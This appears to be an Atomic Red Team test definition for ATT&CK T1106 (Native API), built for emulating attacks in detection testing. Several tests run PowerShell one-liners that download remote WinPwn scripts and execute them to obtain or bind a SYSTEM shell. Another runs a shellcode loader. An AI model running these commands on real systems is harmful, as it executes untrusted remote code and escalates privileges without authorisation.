{
  "attack_technique": "T1106",
  "display_name": "Native API",
  "atomic_tests": [
    {
      "name": "Execution through API - CreateProcess",
      "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "procedure": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe \"#{source_file}\"\n%tmp%/T1106.exe"
      },
      "input_arguments": [
        {
          "arg_name": "source_file",
          "description": "Location of the CSharp source file to compile and execute",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs"
        },
        {
          "arg_name": "output_file",
          "description": "Location of the payload",
          "type": "path",
          "default": "%tmp%\\T1106.exe"
        }
      ],
      "dependencies": [
        {
          "description": "#{source_file} must exist on system.",
          "prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs\" -OutFile \"#{source_file}\""
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "99be2089-c52d-4a4a-b5c3-261ee42c8b62"
    },
    {
      "name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique",
      "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')"
      },
      "input_arguments": [],
      "auto_generated_guid": "ce4e76e6-de70-4392-9efe-b281fc2b4087"
    },
    {
      "name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique",
      "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')"
      },
      "input_arguments": [],
      "auto_generated_guid": "7ec5b74e-8289-4ff2-a162-b6f286a33abd"
    },
    {
      "name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique",
      "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')"
      },
      "input_arguments": [],
      "auto_generated_guid": "e1f93a06-1649-4f07-89a8-f57279a7d60e"
    },
    {
      "name": "Run Shellcode via Syscall in Go",
      "description": "Runs shellcode in the current running process via a syscall.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Use syscall to execute the entrypoint of the shellcode\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "procedure": "$PathToAtomicsFolder\\T1106\\bin\\x64\\syscall.exe -debug"
      },
      "input_arguments": [],
      "auto_generated_guid": "ae56083f-28d0-417d-84da-df4242da1f7c"
    }
  ]
}